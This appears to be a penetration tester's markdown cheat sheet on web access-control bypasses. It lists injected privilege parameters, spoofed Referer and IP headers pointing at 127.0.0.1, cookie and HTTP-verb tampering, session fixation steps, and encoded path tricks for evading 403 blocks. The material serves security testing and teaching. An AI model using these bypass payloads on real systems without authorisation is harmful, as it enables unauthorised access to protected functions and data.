# Content 
- [Mass Assignment / Parameter Based Access Control](#mass-assignment--parameter-based-access-control)
- [Referer Based Access Control](#referer-based-access-control)
- [IP Based Access Control](#ip-based-access-control)
- [Cookie Based Access Control](#cookie-based-access-control)
- [Method Based Access Control / HTTP Verb Tampering](#method-based-access-control--http-verb-tampering)
- [Insecure Calling Functions](#insecure-calling-functions)
- [IDOR](#idor)
- [Session Attacks](#session-attacks)
- [Path fuzzing](#path-fuzzing)



## Mass Assignment / Parameter-based access control
- ex : inject paramter isAdmin=true
- ex : inject paramter role=admin


## Referer-based access control
- ex : if you want to access /admin/deleteusers but it is forbbiden , try put `Referer: /admin/`

## IP-based access control
##### Rewrite IP source:
- X-Originating-IP: 127.0.0.1
- X-Forwarded-For: 127.0.0.1
- X-Forwarded: 127.0.0.1
- Forwarded-For: 127.0.0.1
- X-Forwarded-Host: 127.0.0.1
- X-Remote-IP: 127.0.0.1
- X-Remote-Addr: 127.0.0.1
- X-ProxyUser-Ip: 127.0.0.1
- X-Original-URL: 127.0.0.1
- Client-IP: 127.0.0.1
- X-Client-IP: 127.0.0.1
- X-Host: 127.0.0.1
- True-Client-IP: 127.0.0.1
- Cluster-Client-IP: 127.0.0.1
- X-ProxyUser-Ip: 127.0.0.1
- Via: 1.0 fred, 1.1 127.0.0.1
- Connection: close, X-Forwarded-For (Check [hop-by-hop headers](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/abusing-hop-by-hop-headers.md))
##### Rewrite location:
- X-Original-URL: /admin/console
- X-Rewrite-URL: /admin/console

## Cookie Based Access Control
ex : change cookie Admin=true

## Method Based Access Control / HTTP Verb Tampering
- try different verbs on every function to execute forbidden functions or bypass protection filters

| HTTP Method | Description                                                                                               |
|-------------|-----------------------------------------------------------------------------------------------------------|
| GET         | The GET method requests a representation of the specified resource. Requests using GET should only retrieve data. |
| HEAD        | The HEAD method asks for a response identical to a GET request, but without the response body.         |
| POST        | The POST method submits an entity to the specified resource, often causing a change in state or side effects on the server. |
| PUT         | The PUT method replaces all current representations of the target resource with the request payload.   |
| DELETE      | The DELETE method deletes the specified resource.                                                       |
| CONNECT     | The CONNECT method establishes a tunnel to the server identified by the target resource.                |
| OPTIONS     | The OPTIONS method describes the communication options for the target resource.                         |
| TRACE       | The TRACE method performs a message loop-back test along the path to the target resource.               |
| PATCH       | The PATCH method applies partial modifications to a resource.                                           |


## Insecure Calling Functions 
- check if you can call controlling functions `like in admin panel` without accessing the page itself

## IDOR
- check [IDOR](https://github.com/kiro6/penetration-testing-notes/tree/main/web%20pentest/Idor)



## Session Attacks 
### Session Fixation 
##### 1. obtain a valid session identifier
##### 2. fixate a valid session identifier, this can happen if : 
- The assigned session identifier pre-login remains the same post-login
- Session identifiers (such as cookies) are being accepted from URL Query Strings or Post Data and propagated to the application

## Path fuzzing
**If /path is blocked:**

- Try using `.` or` %2e`: /%2e/path


(if the access is blocked by a proxy, this could bypass the protection). Try also /%252e/path (double URL encode)

- Try Unicode bypass: `/%ef%bc%8fpath`


(The URL encoded chars are like “/”) so when encoded back it will be //path and maybe you will have already bypassed the /path name check


**Other path bypasses:**

- site.com/secret –> HTTP 403 Forbidden
- site.com/SECRET –> HTTP 200 OK
- site.com/secret/ –> HTTP 200 OK
- site.com/secret/. –> HTTP 200 OK
- site.com//secret// –> HTTP 200 OK
- site.com/./secret/.. –> HTTP 200 OK
- site.com/;/secret –> HTTP 200 OK
- site.com/.;/secret –> HTTP 200 OK
- site.com//;//secret –> HTTP 200 OK
- site.com/secret.json –> HTTP 200 OK (ruby)

I prefer using the 403 Bypasser Burp extension by Gil Nothmann to automate the bypass techniques.
